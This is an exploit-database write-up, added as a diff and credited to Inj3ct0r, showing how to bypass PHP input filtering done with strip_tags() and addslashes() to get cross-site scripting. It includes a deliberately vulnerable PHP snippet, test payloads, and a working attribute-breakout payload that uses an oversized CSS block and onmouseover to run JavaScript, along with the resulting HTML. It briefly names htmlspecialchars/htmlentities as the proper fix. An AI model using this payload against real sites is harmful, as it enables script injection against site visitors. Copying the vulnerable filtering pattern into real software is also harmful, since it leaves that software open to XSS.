@@ -1,0 +1,77 @@
+=====================================================
+Workaround strip_tags () and addslashes () in the XSS
+=====================================================
+
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0                          
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      0
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-1
+
+#[+] Discovered By   : Inj3ct0r
+#[+] Site            : Inj3ct0r.com
+#[+] support e-mail  : submit[at]inj3ct0r.com
+	
+So, imagine such a simple script:
+
+
+PHP code:
+
+<?php 
+$xss=''; 
+$xss=trim(strip_tags(addslashes($xss))); 
+print '<input name="123" value="'.$xss.'"/>'; 
+?>
+
+	
+Now the standard test methods:
+
+PHP code:
+
+ //1 
+$xss='" onmouseover=alert(1) a="'; 
+//2 
+$xss='"><script>alert(1)</script><'; 
+
+	
+In the first case, we removed XSS function addslashes (),
+in the second - a function strip_tags. XSS is not gone = (
+
+
+Now, our variable set equal to the following value:
+
+PHP code:
+
+$xss='" style="a:b;margin-top:-1000px;margin-left:-100px;width:4000px;height:4000px;display:block;" onmouseover=alert(1); a="';
+
+
+Get this html code:
+
+<input name="123" value="\" style=\"a:b;margin-top:-1000px;margin-left:-100px;width:4000px;height:4000px;display:block;\" onmouseover=alert(1); a=\""/> 
+
+
+Alert! =))
+	
+Usually applies htmlspecialchars () / htmlentities (), and this is the surest way to protect against XSS.
+
+Now we are not an obstacle as strip_tags, and addslashes =)
+
+As you can see, there is closure of the first attribute, then a big block of CSS and the implementation of javascript onmouseover =)
+
+Tested on IE8, Firefox 3, Opera 9.51, and Safari 3
+
+ThE End =]  Visit my proj3ct  :
+
+http://inj3ct0r.com
+http://inj3ct0r.org
+http://inj3ct0r.net
+
+# ~  - [ [ : Inj3ct0r : ] ]
